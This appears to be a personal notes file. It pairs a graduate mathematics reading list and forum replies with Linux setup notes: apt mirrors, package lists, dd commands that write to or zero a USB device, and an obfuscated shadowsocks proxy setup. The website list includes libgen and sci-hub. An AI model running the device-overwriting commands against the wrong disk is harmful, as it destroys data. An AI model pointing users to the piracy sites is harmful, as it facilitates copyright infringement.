J.Weidmann，Linear Operators in Hilbert Spaces，Springer。

Alain Connes，Noncommutative Geometry，Academic Press。

Yuri Manin，Quantum Groups and Noncommutative Geometry，CRM。

J-L.Loday，Cyclic Homology，Springer。

Yu.P.Solovyov、E.V.Troitsky，C*-Algebras and Elliptic Operators in Different
ial Topology，AMS。

T.K.Jensen，Elements of KK-theory，Birkhauser。

B.Blackadar，K-theory for Operator Algebras，Springer。

O.Bratteli、D.W.Robinson，Operator Algebras and Quantum Statistical Mechanic
s，Springer。

R.G.Douglas，C*-algebras Extensions And K-Homology，Princeton University Pre
ss。

代数分析与非线性泛函分析方向：

E.B.Davies，One-Parameter Semigroups，Academic Press。

V.S.Vladimirov，Generalized Functions in Mathematical Physics，MIR。

K.Deimling，Nonlinear Analysis，Springer。

L.L.Hormander，The Analysis of Linear Partial Differential Operators Vol 2-4
，Springer。

H.H.Schaefer，Topological Vector Spaces，Springer。

G.Kato、D.C.Struppa，Fundamentals of Algebraic Microlocal Analysis，CRC。

M.Kashiwara、T.Kawai、T.Kimura，Foundation of Algebraic Analysis，Princeton
University Press。

M.A.Shubin，Pseudo-differential Operators and Spectral Ttheory，Springer。

M.Morimoto，Introduction to Sato Hyperfunctions，AMS。

黎曼几何与度量几何方向：

P.Petersen，Riemannian Geometry，Springer。

A.T.Fomenko，Plateau's Problem，Gordon & Breach。

J.Cheeger，Comparison theorems in Riemannian geometry，AMS。

W.Klingenberg，Lectures on Closed Geodesics，Springer。

M.Gromov，Metric structures for Riemannian and non-Riemannian spaces，Birkha
user。

D.Burago、Yu.Burago、S.Ivanov、I.Burago，A Course in Metric Geometry，Birkha
user。

J.K.Beem、P.E.Ehrlich、K.L.Easley，Global Lorentzian geometry，Marcel Dekker
。

W.Ballmann， Geometric Structures（http://www.math.uni-bonn.de/people/hwbllm
nn/archiv/geostr00.ps）。

A.T.Fomenko、A.A.Tuzhilin，Geometry of Minimal Surfaces in Three-Dimensional
 Space，AMS。

U.Hamenstadt，Applications of Teichmueller Theory to Hyperbolic 3-Manifolds，
Birkhauser。

S.Markvorsen，Global Riemannian Geometry：Curvature and Topology，Birkhauser
。

M.R.Bridson，Metric Spaces of Non-Positive Curvature，Springer。

A.L.Besse，Einstein Manifolds, Classics in Mathematics，Springer。

D.V.Anosov，Geodesic Flows on Closed Riemann Manifolds with Negative Curvatu
re，Proceedings of the Steklov Institute of Mathematics，90(1969)。

辛几何与辛拓扑方向：

A.T.Fomenko，Symplectic Geometry，Gordon & Breach Publishers。

D.McDuff、D.Salamon，Introduction to Symplectic Topology，Oxford University
Press。

D.McDuff、D.Salamon，J-Holomorphic Curves and Quantum Cohomology，AMS。

Maurice de Gosson，Symplectic Geometry and Quantum Mechanics，Birkhauser。

J.B.Etnyre，Introductory Lectures on Contact Geometry，（http://arxiv.org/ab
s/math.SG/0111118）。

D.A.Cox、S.Katz，Mirror Symmetry and Algebraic Geometry，AMS。

M.Audin，Symplectic Geometry of Integrable Hamiltonian Systems，Birkhauser。


H.Lawson、M-L.Michelsohn，Spin Geometry，Princeton University Press。

V.Guillemin、S.Sternberg，Symplectic Techniques in Physics，Cambridge Univer
sity Press。

N.Hurt，Geometric Quantization in Action，Riedel。

N.M.J.Woodhouse，Integrability，Self Duality，and Twistor Theory，Oxford Uni
versity Press。

代数拓扑学方向：

S.I.Gelfand、Yuri Manin，Methods of Homological Algebra，Springer。

R.M.Switzer，Algebraic topology-homotopy and homology，Springer。

M.F.Atiyah，K-Theory，Benjamin。

G.Whitehead，Elements of Homotopy Theory，Springer。

M.Aubry，Homotopy Theory and Models，Birkhauser。

Y.Felix、S.Halperin、J-C.Thomas，Rational Homotopy Theory，Springer。

D.Husemoller，Fibre Bundles，Springer。

D.Quillen，Homotopical algebra，Springer。

A.Hatcher，Vector Bundles and K-theory，Cambridge University Press。

F.Hizeburch，Topological Methods in Algebraic Geometry，Springer。

D.C.Ravenal，Complex Cobordism and Stale Homotopy Groups of Spheres，Academi
c Press。

R.E.Stong，Notes on Cobordism Theory，Princeton University Press。

J.Milnor，Lectures on the h-cobordism Theorem，Princeton University Press。

J.Milnor，Characteristic Classes，Princeton University Press。


几何拓扑学方向：

J.Milnor，Singular Points of Hypersurface，Princeton University Press。

S.K.Donaldson、P.B.Kronheimer，The Geometry of Four-Manifolds，Oxford Univer
sity Press。

W.P.Thurston，Three-Dimensional Geometry and Topology，Princeton University
Press。

J.D.Moore，Lectures on Seiberg-Witten Invariants，Springer。

J.Morgan，Gauge Theory and the Topology of Four-Manifolds，AMS。

L.H.Kauffman，Knots and Physics，World Scientific。

T.Ohtsuki，Quantum Invariants，World Scientific。

K.Mahdavi，Current Developments in Mathematical Biology，World Scientific。

D.Ruberman、N.Saveliev，Rohlin's Invariant and Gauge Theory I（http://arxiv.
org/abs/math/0302131）。

D.Ruberman、N.Saveliev，Rohlin's Invariant and Gauge Theory II（http://arxiv
.org/abs/math/0306188）。

D.Ruberman、N.Saveliev，Rohlin's Invariant and Gauge Theory III（http://arxi
v.org/abs/math/0404162）。

Y.M.Eliashberg、W.P.Thurston，Confolations，AMS。

A.Candel、L.Conlon，Foliations，AMS。

I.A.Dynnikov，The Alexander Polynomial in Several Variables Can be Expressed
 in Terms of the Vassiliev Invariants，Russian Mathematical Surveys(1997)52。


I.A.Dynnikov，On a Yang-Baxter Map and the Dehornoy Ordering，Russian Mathem
atical Surveys(2002)57。

R.Rajaraman，Solitons and Instantons，North-Holland。

D.Freed、K.Uhlenbeck，Instantons and Four-Manifolds，Springer,。

V.G.Turaev，Reidemeister Torsion in Knot Theory，Russian Mathematical Survey
s (1986) 41 No 1。

V.G.Turaev， The Yang-Baxter Equation and Invariants of Links，Inventiones M
athematicae (1988) 92, No 3。

E.Artin，Theory of braids，Annals of Mathematics (1947) (2) 48。

D.Bar-Natan，On the Vassiliev Knot Invariant，Topology, 34 (1995)。

F.A.Garside，The Braid Group and Other Groups，The Quarterly Journal of Math
ematics (2) 20 (1969)。

I.A.Dynnikov，Arc-presentations of Links，Monotonic Simplification（http://a
rxiv.org/abs/math.GT/0208153）。

V.F.R.Jones，A Polynomial Invariant for Links via von Neumann Algebras，Bull
etin of the American Mathematical Society 12 (1985)。

离散与组合几何方向：

R.Schneider，Convex Bodies–the Brunn-Minkowski theory，Cambridge University
 Press。

P.M.Gruber，Convex and Discrete Geometry，Springer。

J.W.P.Hirschfeld，Projective Geometries over Finite Fields，Clarendon Press。


B.Grunbaum，Convex Polytopes，Springer。

H.Hadwiger、H.Debrunner，Combinatorial Geometry. Holt。

J.Matousek，Lectures on Discrete Geometry, Springer。

L.Fejes-Toth，Regular Figures，Pergamon。

J.H.Conway、N.J.A.Sloane，Sphere Packings，Lattices and Groups，Springer。

P.M.Gruber、C.G.Lekkerkerker，Geometry of Numbers，North-Holland。

动力系统方向：

V.I.Arnold，Geometrical Methods in the Theory of Ordinary Differential Equat
ions，Springer。

J.Guckenheimer、P.Holmes，Nonlinear Oscillations, Dynamical Systems and Bifu
rcations of Vector Fields，Springer。

K.Falconer，Fractal Geometry-Mathematical and Applications，John Wiley & Son
s。

R.Engelking，General Topology，PWN。

V.I.Arnold，Mathematical Aspects of Classical and Celestial Mechanics，Sprin
ger。

S.Chow、J.K.Hale，Methods of Bifurcation Theory，Springer。

J.Milnor，Dynamics in One Complex Variable，Vieweg。

I.P.Comfeld、S.V.Fomin、Yakov Sinai，Ergodic Theory，Springer。

Yakov Sinai，Topics in Ergodic Theory，Princeton University Press。

K.S.Sibirsky，Introduction to Topological Dynamtics，Benjamin。

V.I.Arnold，Ergodic Problems in Mathematical Physics，Benjamin。

Z.Nitecki，Differentail Dynamical，MIT。

偏微分方程方向：

L.C.Evens，Partial Differential Equation，AMS。

E.M.Landis，Second Order Equations of Elliptic and Parabolic Type，AMS。

N.V.Krylov，Nonlinear Elliptic and Parabolic Equations of the Second Order，
Reidel。

李大潜，物理学与偏微分方程，高等教育出版社。

G.Evans、J.Blackledge、P.Yardley，Analytic Methods for Partial Differential
Equations，Springer。

K.J.Engel、R.Nagel，One-Parameter Semigroups for Linear Evolution Equations，
Springer。

J.C.Robinson, Infinite-dimensional Dynamical Systems, Cambridge University P
ress。

Peter Lax、P.Phillips，Scattering  Theory，Academic Press。

H.Tanabe，Equations of Evolution，Pitman。

J.Smoller，Shock Waves and Reaction-Diffusion Equations，Springer。

P.Constantin、C.Foias，Navier-Stokes equations，Chicago University Press。

L.V.Ovisannikov，Group Analysis of Differentail Equations，Academic Press。

V.I.Arnold，Topological Methods in Hydrodynamics，Springer。

A.V.Bitsadze，Equations of Mixed Type，Pergamon。

G.Whitham，Linear and Nonlinear Waves，John-Wiley。

E.J.Hinch，Perturbation Methods，Cambridge University Press。

O.A.Ladyzhenskaya，Mathematical Theory of Viscous Incompressible Flow，Gordo
n & Breach。

O.A.Ladyzhenskaya，The Boundary Value Problems of Mathematical Physics，Spri
nger。

A.Bensoussan、J-T.Lions、G.Papanicolaou，Asymptotic Analysis for Periodic St
ructures，North Holland。

W.Eckhaus，Asymptotic Analysis of Singular Perturbations，North-Holland。

R.Glassey，The Cauchy problem in Kinetic Theory，SIAM。

J-L.Lions、E.Magenes，Non-Homogeneous Boundary Value Problems and Applicatio
ns，Springer。

Qing Han，Fanghua Lin，Elliptic Partial Differential Equations，NYU。

T.Aubin，Nonlinear Analysis on Manifolds，Monge-Ampere Equations，Springer。


M.Struwe，Variational methods，Springer。

量子场论与弦论方向：

D.H.Perkins，Introduction to High Energy Physics，Addison-Wesley。

A.M.Polyakov，Gauge Fields and Strings，CRC。

B.Zwiebach，A First Course in String Theory，Cambridge University Press。

J.Polchinski，String Theory，Cambridge University Press。

侯伯元、侯伯宇，物理学家用微分几何，科学出版社。

P.J.E.Peebles，Principles of physical cosmology，Princeton University Press。


C.Johnson，D-branes，Cambridge University Pres。

J.Wess、J.Bagger，Supersymmetry and Supergravity，Princeton University Press
。

S.W. Hawking，The Large Scale Structure of Space-Time，Cambridge University
Press。

S.Chandrasekhar，The Mathematical Theory of Black Holes，Clarendon Press。

Yakov Zeldovich、I.D.Novikov，Relativistic Astrophysics，University of Chica
go Press。

Yuri Manin，Gauge Field Theory and Complex Geometry，Springer。

Marcos Marino，Chern-Simons Theory，Matrix Models and Topological Strings，O
xford University Press。

E.Frenkel，Lectures on the Langlands Program and Conformal Field Theory（htt
p://arxiv.org/abs/hep-th/0512172）。

可积系统方向

L.A.Dickey，Soliton Equation and Hamiltonian System，World Scientific。

R.Alicki、M.Fannes，Quantum Dynamical Systems，Oxford University Press。

A.R.Chowdhury、A.G.Choudhury，Quantum Integrable Systems，CRC。

L.D.Faddeev、L.A.Takhtajan，Hamiltonian Methods in the Theory of Solitons，A
ddison-Wesley。

M.A.Ablowitz、P.A.Clarkson，Solitons，Nonlinear Evolution Equations and Inve
rse Scattering，Cambridge University Press。

E.D.Belokolos、A.I.Bobenko、V.Z.Enolsky、A.R.Its、V.B.Matveev，Algebro-Gemet
ric Approach to nonlinear Integrable Equations，Springer。

V.B.Matveev、M.A.Salle，Darboux Transformations and Solitons, Springer。

V.E.Korepin、N.M.Bogoliubov、A.G.Izergin、Quantum Inverse Scattering Method
and Correlation Functions，Cambridge University Press。

P.Etingof，The Dynamical Yang-Baxter Equation，Representation Theory and Qua
ntum Integrable Systems，Oxford University Press。

L.D.Faddeev，Integrable Models in 1+1 Dimensional Quantum Field Theory，Else
vier。

A.Martin，From Quantum Cohomology to Integrable Systems，Oxford University P
ress。

B.Dubrovin，Geometry of Hamiltonian Evolutionary Systems，Bibliopolis。

概率论与随机分析方向：

I.I.Gihman、A.V.Skorokhod, Theory of Stochastic Processes，Springer。

D.Revuz、M.Yor，Continuous Martingales and Brownian Motion，Springer。

Paul Malliavin，Stochastic Analysis，Springer。

den Hollander，Large deviations，AMS。

D.Nualart，The Malliavin Calculus and Related Topics，Springer。

B.K.Oksendal，Stochastic Differential Equations，Springer。

V.I.Bogachev，Gaussian Measures，AMS。

Yuri Gliklikh，Global Analysis in Mathematical Physics，Springer。

G.Adomian，Nonlinear Stochastic Operator Equations，Academic Press。

M.L.Mehta，Random Matrices，Elsevier。

K.R.Parthasarathy，An Introduction to Quantum Stochastic Calculus，Birkhause
r。

K.B.Sinha，Quantum Stochastic Processes and Noncommutative Geometry，Cambrid
ge University Press。

G.Pisier，Factorization of Linear Operators and Geometry of Banach Spaces，A
cademic Press。

L.Gross，Hypercontractivity，Logarithmic Sobolev Inequalities and Applicatio
ns，Princeton University Press。

G.Giacomin，Random Polymer Models，World Scientific。

J-F.Le Gall，Spatial Branching Processes，Random Snakes and Partial Differen
tial Equations，Birkhauser。

I.Cuculescu、A.Oprea，Non-Commutative Probability，Kluwer。

T.Liggett，Interacting Particle Systems，Springer。

S.Asmussen、H.Hering，Branching Processes，Birkhauser。

J.L.Doob，Classical Potential Theory and Its Probabilistic Counterpart，Spri
nger。

B.Beauzam，Introduction to Banach Spaces and Their Geometry，North-Holland。


M.Henkel，Conformal Invariance and Critical Phenomena，Springer。

B.Duplantier，Conformal Random Geometry（http://arxiv.org/abs/math-ph/060805
3）。

W.Werner，Lectures on two-Dimensional Critical Percolation（http://arxiv.org
/abs/0710.08563）。



euro



我很晕

列的书太多了。不要把新生吓坏，我已被吓的半死。还是及早开始科研吧。做科研不需
要许多。学太多也要出问题。希望科大学生能把抽象代数学的深一点。还要花时间多思
考，多讨论。“EGA全部看完，那很困难，特别是这本书只有法文版，没有英文版，老实
说我也没有看完”，佩服佩服，能看看就很好。我没看过。科大有EGA，或代数几何 的
讨论班吗？


义务劳动



上面那个书单我是按研究方向列的，其实还应该再分细点，比如说代数，我主要是考虑
做代数表示论和代数群和量子群的。我想选几本和自己做的方向有关的书的相关章节看
看就好了。你说的应该及早开始科研这一点，学太多也会出问题这两点，我非常同意。


EGA以前我和朋友讨论过，觉得EGA架构太大，如果是一上手就看这个，又没有指导的话
，肯定犯糊涂，而且现在里面的专题大多有相关专著，比如说 Etale Cohomology。当然
了，我想有时间看看还是很好的。科大现在有没有代数几何的讨论班我倒还不太清楚了
，不过我想如果自己组织讨论班的话，可能组织Arakelov几何、 Langlands Programme
、非对易几何、叶状结构方面的系列讨论班更加重要吧！另外我觉得Werner和Duplanti
er的那些东西恐怕也挺重要的，或许会成为新的增长点，但是国内没人搞。
** books
** websites
http://mathoverflow.net/
https://arxiv.org/
http://www.ams.org/
https://www.mathunion.org/
http://terrytao.wordpress.com/
http://libgen.io/
https://link.springer.com/
http://math.mit.edu/academics/classes.php
https://math.stackexchange.com/
http://sci-hub.tw/
http://www.sci-hub.la/
https://www.ias.edu/
http://www.ihp.fr/
https://www.mpg.de/de
* computer
unix aix freebsd trueos linux debian centos
** Operating System
*** linux

*** installing os
**** debian
partition
/              250-350MB,include /usr 4-6GB
/boot          200MB
/usr           >500M,4-6GB,usually included on /
/usr/local     20-30GB
/tmp           2GB
/var           3GB
/swap          8GB
/home          the rest

vi /etc/sources.list

#debian stable

#USTC

deb http://mirrors.ustc.edu.cn/debian stable main contrib non-free
deb-src http://mirrors.ustc.edu.cn/debian stable main contrib non-free

deb http://mirrors.ustc.edu.cn/debian stable-updates main contrib non-free
deb-src http://mirrors.ustc.edu.cn/debian stable-updates main contrib non-free

deb http://mirrors.ustc.edu.cn/debian stable-proposed-updates main contrib non-free
deb-src http://mirrors.ustc.edu.cn/debian stable-proposed-updates main contrib non-free

deb http://mirrors.ustc.edu.cn/debian-security/ stable/updates main non-free contrib
deb-src http://mirrors.ustc.edu.cn/debian-security/ stable/updates main non-free contrib
#USA

deb http://http.us.debian.org/debian stable main contrib non-free
deb-src http://http.us.debian.org/debian stable main contrib non-free

deb http://http.us.debian.org/debian stable-updates main contrib non-free
deb-src http://http.us.debian.org/debian stable-updates main contrib non-free

deb http://http.us.debian.org/debian stable-proposed-updates main contrib non-free
deb-src http://http.us.debian.org/debian stable-proposed-updates main contrib non-free

deb http://security.debian.org/debian-security  stable/updates main contrib non-free
deb-src http://security.debian.org/debian-security  stable/updates main contrib non-free

#debian testing

#USTC

deb http://mirrors.ustc.edu.cn/debian testing main contrib non-free
deb-src http://mirrors.ustc.edu.cn/debian testing main contrib non-free

deb http://mirrors.ustc.edu.cn/debian testing-updates main contrib non-free
deb-src http://mirrors.ustc.edu.cn/debian testing-updates main contrib non-free

deb http://mirrors.ustc.edu.cn/debian testing-proposed-updates main contrib non-free
deb-src http://mirrors.ustc.edu.cn/debian testing-proposed-updates main contrib non-free

deb http://mirrors.ustc.edu.cn/debian-security/ testing/updates main non-free contrib
deb-src http://mirrors.ustc.edu.cn/debian-security/ testing/updates main non-free contrib

#USA

deb http://http.us.debian.org/debian testing main contrib non-free
deb-src http://http.us.debian.org/debian testing main contrib non-free

deb http://http.us.debian.org/debian testing-updates main contrib non-free
deb-src http://http.us.debian.org/debian testing-updates main contrib non-free

deb http://http.us.debian.org/debian testing-proposed-updates main contrib non-free
deb-src http://http.us.debian.org/debian testing-proposed-updates main contrib non-free

deb http://security.debian.org/debian-security  testing/updates main contrib non-free
deb-src http://security.debian.org/debian-security  testing/updates main contrib non-free

#kali

#USTC

deb http://mirrors.ustc.edu.cn/kali kali-rolling main contrib non-free

deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main contrib non-free

#USA

deb http://http.kali.org/kali kali-rolling main non-free contrib
deb-src http://http.kali.org/kali kali-rolling main non-free contrib

apt install emacs gcc gdb make automake git fcitx chromium sougoupinyin
transmission amule clamav latex（AMS-TeX/AMS-LaTeX，TeX Live，Lyx） terminator
xterm tmux katoolin spotify-client aria2(安装使用aria2下载百度网盘内容,到火狐浏览器或谷歌浏览器插件下载库下载 Baiduexporter) uget thunderbird evolution vlc rhythmbox cmus moc
Thunderbird Evolution
标记语言转换工具：Pandoc
视频下载工具：you-get,pip3 install you-get,pip3 install --upgrade you-get
Installation:
       Put something like this in your $HOME/.bashrc or $HOME/.zshrc:

              . /path/to/z.sh
                /opt/z/z.sh

apt update
WiFi
apt-get update
apt-get install firmware-iwlwifi
modprobe -r iwlwifi;modprobe iwlwifi
屏幕截图工具，shutter,kazam;录屏工具，simplescreenrecorder,爬虫搜索，Nutch,Scrapy,
电子书calibre，chm xchm
安装搜狗输入法
虽然自带的也还行
$ echo deb http://archive.ubuntukylin.com:10006/ubuntukylin trusty main | sudo tee /etc/apt/sources.list.d/ubuntukylin.list
$ sudo apt-get update
$ sudo apt-get install sogoupinyin
注 : 如果提示没有公钥,无法验证下列数字签名 xxx
如果重启后只有搜狗输入法,则在命令行使用fcitx-configtool命令,添加系统输入法
$ sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-　keys xxxx
$ sudo apt-get update

cisco,gns3
thefuck命令改正
apt install python3-dev python3-pip python3-setuptools
pip3 install thefuck
Evernote，everpad，nixnote
password generator,pwgen
sudo apt install fcitx
sudo dpkg -i 安装下载的搜狗输入法.deb
sudo apt install -f

xampp
chrome plugins,SwitchOmega
apt dist-upgrade
依赖错误, 安装相应的依赖即可. 或者自动安装缺少依赖:sudo apt install -f
install and uninstall
apt purge packagename
dpkg -i package-file-name
dpkg -l | grep 'tcl'
dpkg -P tcl8.4
设置中文环境，配置locales：#dpkg-reconfigure locales
linux下有很多工具可以制作启动盘，不过我们可以使用linux下的一条命令来完成
dmesg
cat debian-8.0.0-amd64-i386-netinst.iso >/dev/sdb;sync

dd命令
操作方法:
1 卸载你的U盘
 假设你的u盘对应的设备是sdb1(可以使用df查看或者fdisk)
 sudo umount /dev/sdb1
2 写入linux(ubuntu fedora .....)系统
sudo dd if=系统路径  of=/dev/sdb
例如 sudo dd if=./ubuntu-13.04-beta2-desktop-amd64.iso of=/dev/sdb
注意：of后面的设备一定需要注意，选错了可能会造成不可逆的损失，制作时看
清你的U盘对应的设备
Debian 9 (Stretch) 上部署 shadowsocks-libev 服务端并开启混淆
就个人看法来说，如果操作系统采用 Debian，无论是作为客户端还是服务端，使用 shadowsocks-libev 都是一种非常舒适流畅的体验。本文介绍如何在 Debian 系统中搭建 ss-libev 服务端。
注：以下的所有命令，都是针对 Debian 9 Stretch，并在 root 用户下执行的。
安装
添加 stretch-backports：
sh -c 'printf "deb http://deb.debian.org/debian stretch-backports main" > /etc/apt/sources.list.d/stretch-backports.list'
apt update
安装 shadowsocks-libev 和 simple-obfs：
apt -t stretch-backports install shadowsocks-libev simple-obfs -y
配置
编辑配置文件：
vim /etc/shadowsocks-libev/config-obfs.json
/etc/shadowsocks-libev/config-obfs.json
{
    "server":["::0","0.0.0.0"],
    "server_port":端口,
    "local_port":1080,
    "password":"密码",
    "timeout":60,
    "method":"aes-256-gcm",
    "mode":"tcp_and_udp",
    "fast_open":false,
    "plugin":"obfs-server",
    "plugin_opts":"obfs=http"
}
接下来，编辑 /etc/default/shadowsocks-libev 指定使用哪个配置文件，如下所示，更改了文件中 CONFFILE 的值（改成了 config-obfs.json ）：
vim /etc/default/shadowsocks-libev
/etc/default/shadowsocks-libev
# Defaults for shadowsocks initscript
# sourced by /etc/init.d/shadowsocks-libev
# installed at /etc/default/shadowsocks-libev by the maintainer scripts
#
# This is a POSIX shell fragment
#
# Note: `START', `GROUP' and `MAXFD' options are not recognized by systemd.
# Please change those settings in the corresponding systemd unit file.
# Enable during startup?
START=yes
# Configuration file
CONFFILE="/etc/shadowsocks-libev/config-obfs.json"
# Extra command line arguments
DAEMON_ARGS="-u"
# User and group to run the server as
USER=nobody
GROUP=nogroup
# Number of maximum file descriptors
MAXFD=32768
启动并检查
激活服务，以便开机自动启动：
systemctl enable shadowsocks-libev
启动服务：
systemctl start shadowsocks-libev
查看服务状态：
systemctl status shadowsocks-libev
至此，对服务端的部署配置愉快完成。
Debian 9 (Stretch) 上使用 shadowsocks-libev 客户端并开启混淆
本文介绍如何在 Debian 系统上使用 ss-libev 客户端。服务端部署教程见这里。
注：使用 simple-obfs 混淆时，请确认服务端同样开启了混淆功能。以下的所有命令，都是针对 Debian 9 Stretch，并在 root 用户下执行的。
安装
添加 stretch-backports：
sh -c 'printf "deb http://deb.debian.org/debian stretch-backports main" > /etc/apt/sources.list.d/stretch-backports.list'
apt update
安装 shadowsocks-libev 和 simple-obfs：
apt -t stretch-backports install shadowsocks-libev simple-obfs -y
配置
编辑配置文件：
vim /etc/shadowsocks-libev/config-obfs.json
/etc/shadowsocks-libev/config-obfs.json
{
    "server":"服务器地址",
    "server_port":端口,
    "local_port":1080,
    "password":"密码",
    "timeout":60,
    "method":"aes-256-gcm",
    "mode":"tcp_and_udp",
    "fast_open":false,
    "plugin":"obfs-local",
    "plugin_opts":"obfs=http;obfs-host=混淆用的域名"
}
启动并检查
激活服务，以便开机自动启动：
systemctl enable shadowsocks-libev-local@config-obfs
启动服务：
systemctl start shadowsocks-libev-local@config-obfs
查看服务状态：
systemctl status shadowsocks-libev-local@config-obfs
至此，对客户端的配置完成，代理服务在localhost:1080上。

运维学习需要分为四个阶段，linux初级入门-àlinux中级进阶-àlinux高级提升，和资深方向细化。
第一阶段：初级入门
初级阶段需要把linux学习路线搞清楚，任何学习都是循序渐进的，所以学linux也是需要有一定的路线。
个人建议学习的路线如下：
初级入门：
1、Linux基础知识、基本命令（起源、组成、常用命令如cp、ls、file、mkdir等常见操作命令）
2、Linux用户及权限基础
3、Linux系统进程管理进阶
4、linux高效文本、文件处理命令（vim、grep、sed、awk、find等命令）
5、SHELL脚本入门（可边练习边学习）
第二阶段:中级进阶
中级进阶需要在充分了解LINUX原理和基础知识之后，对上层的应用和服务进行深入学习，其中说到服务肯定涉及到网络的相关知识，是需要花时间学习的。
1、TCP/IP网络基础（差不多CCNA、NP的知识就够用）
2、LINUX企业常用服务（如DNS、HTTP、FTP、MAIL、NFS等）
3、LINUX企业级安全原理和防范技巧（系统性能/安全、安全威胁模型和保护方法
4、加密/解密原理及数据安全、系统服务访问控制及服务安全基础
5、IPTABLES安全策略构建
6、SHELL脚本进阶（主要是结合一些应用，写一些案例）
7、MYSQL应用原理及管理入门（能管理和搭建一个个人博客站点）
学到这里，掌握的基本技能，已经够用了，已经能做一些基础的运维工作和简单维护了。
第三阶段：高级提升
1、HTTP服务代理缓存加速（其中主要学习VARNISH、NGINX缓存系统，要对CDN的知识有所了解。）
2、企业级负载集群（其中主要学习NGINX、HAPROXY、LVS要对主要知识熟练掌握，对负载均衡算法有清晰认识，）
3、企业级高可用集群 （其中需要对KEEPALIVED，HEARTBEAT等进行深入讲解）
4、运维监控ZABBIX详解（主要是ZABBIX、CACTI、NAGIOS等监控系统，现在用的比较多的是ZABBIX）
5、运维自动化学习（需要学一些开源运维自动化工具的使用如ANSIBLE、PUPPET、COBBLER等运维自动化工具）
能掌握到这里，基本能处理搞定很多工作了，可以去面试高级运维工程师，差不多薪资能达到12-18K左右
第四阶段：资深方向进阶
1、大数据方向（需要对HADOOP、STORM等常见开源大数据系统需要深入了解）
2、云计算方向（主要是OPENSTACK这套东西，当然像一些KVM等虚拟化技术，也是需要掌握的，现在DOCKER也比较流行）
3、运维开发（主要是PYTHON运维开发）
4、自动化运维（在之前自动化基础上做深入）
5、运维架构师（主要需要广度，差不多5年左右以上经验，可以担当此职位）
另外，再推荐个不错的微信账号，经常会发一些LINUX书籍和学习视频，添加《马哥LINUX运维》可关注这个微信

**** centos
1 执行CentOS7 最小安装
安装完成后执行yum update更新系统。然后，执行

# yum install epel-release

安装额外包yum源（extra package for Enterprise Linux）。

2 安装X Window system
执行yum groupinstall "X Window system"，安装X。

安装完成后执行sudo systemctl isolate graphical.target检验安装成功。

3 安装Xfce4
执行 yum groupinstall xfce  安装Xfce桌面环境。

执行sudo systemctl isolate graphical.target,进入Xfce。

这样在重启系统后还是会默认进入黑屏文本界面

runlevel   返回当前运行级别
systemctl set-default graphical.target      设置默认启动级别为图形化界面
*** linux宕机
使用 SysRq 重启计算机的方法：
Alt + SysRq + [R-E-I-S-U-B]
——台式机键盘或者全尺寸键盘

Fn + Alt + SysRq + [R-E-I-S-U-B]
——部分笔记本键盘

解释：括号内的英文字母需要依次顺序按下，而且每次按下字母后需要间隔 5-10s 再执行下一个动作。
（如 alter +SysRq + R，间隔10s 后再按 alter+ SysRq +E，以此类推）切记不可快速按下 R-E-I-S-U-B ，否则后果和 扣电池拔电源线无异！
R-E-I-S-U-B 这个序列的推荐使用方式是：R – 1 秒 – E – 30 秒 – I – 10 秒 – S – 5 秒 – U – 5 秒 – B
字母顺序的记忆方法很简单，busy — busier — (reverse) — reisub — R-E-I-S-U-B （想来也是 linus 那斯杰作吧，lol）

*** xampp
Change the permissions to the installer
chmod 755 xampp-linux-*-installer.run
Run the installer
sudo ./xampp-linux-*-installer.run
That's all. XAMPP is now installed below the /opt/lampp directory
To start XAMPP simply call this command:
sudo /opt/lampp/lampp start
To stop XAMPP simply call this command:
sudo /opt/lampp/lampp stop
uninstall
rm -rf /opt/lampp
*** make U盘
# cp debian.iso /dev/sdX
# sync

0×1.Ubuntu使用dd命令制作U盘系统启动盘
dd命令是比较推荐的一种Linux环境中制作U盘启动盘的方式，无需安装额外的工具，基本上所有Linux发行版都集成了这个命令。
制作方法示例：
#1.查看U盘设备号，本例使用了8G的U盘，并且知道计算机安装了两块硬盘，那么U盘设备号就可以根据大小和硬盘数量很容易的分辨出来"/dev/sdc"
qing@qingsword.com:~$ sudo fdisk -l
Disk /dev/sdc: 8011 MB, 8011120640 bytes
#2.如果U盘被自动挂载，请使用U盘设备号先umount
qing@qingsword.com:~$ sudo umount /dev/sdc*
#3.准备好一个iso文件，使用dd命令将这个iso写入u盘
# if=后面跟要刻录到u盘的iso文件路径
# of=后面是u盘设备号（不需要带分区号）
# 写入过程是没有数据显示的，只要输出和输入路径没错，耐心等待即可，根据U盘读写速度以及iso文件大小，一般需要5~10分钟左右
qing@qingsword.com:~$ sudo dd if=~/ubuntu-16.04-desktop-amd64.iso of=/dev/sdc
因为是使用dd命令直接将将iso文件数据写入U盘，所以U盘不包含一个标准的分区表，从而导致系统无法正常的识别其大小，也无法正常使用，使用它安装系统后，如果不需要U盘安装盘了，可以使用下面的方法来恢复U盘。

恢复U盘示例：

#0.操作前请用sudo fdisk -l查看U盘分区号，请谨慎操作，不要误写硬盘分区，本例U盘分区号是/dev/sdc
#1.使用dd命令，将0写入U盘的前512字节（代表主引导记录中的引导代码和分区表）
# count=1，写入一次
# bs=512，写入的大小512（byte）
# if=/dev/zero，从系统0生成器读取0
# of=/dev/sdc，写入到U盘中
qing@qingsword.com:~$ sudo dd count=1 bs=512 if=/dev/zero of=/dev/sdc
#2.使用fdisk分区（最好先使用p查看一下还有没有分区，如果第一步操作无误，p将查看不到分区，如果还保留着原有分区，则删除现有分区，重新创建分区），例如只重新划分了一个分区sdc1
qing@qingsword.com:~$ sudo fdisk /dev/sdc
#查看现有分区，如果第一步成功，下面将看不到分区
命令(输入 m 获取帮助)： p
Disk /dev/sdc: 8019 MB
#创建新分区，一路默认回车
命令(输入 m 获取帮助)： n
#将分区更改成NTFS类型，以便Win系统也能识别
命令(输入 m 获取帮助)： t
Selected partition 1
Hex code (type L to list codes): 7
Changed system type of partition 1 to 7 (HPFS/NTFS/exFAT)
#保存
命令(输入 m 获取帮助)： w
#3.重新将U盘拔出插入，如果分区自动挂载，请先卸载，然后对该分区进行格式化，格式化成fat是为了让Windows也能识别（mkfs格式化ntfs非常慢，如果想要格式化成ntfs的，可以用mkfs.ntfs替换）
qing@qingsword.com:~$ sudo umount /dev/sdc1
qing@qingsword.com:~$ sudo mkfs.fat /dev/sdc1

*** PYTHON VERSION
当你安装 DEBIAN LINUX 时，安装过程有可能同时为你提供多个可用的 PYTHON 版本，因此系统中会存在多个 PYTHON 的可执行二进制文件,你可以按照以下方法使用 LS 命令来查看你的系统中都有那些 PYTHON 的二进制文件可供使用:
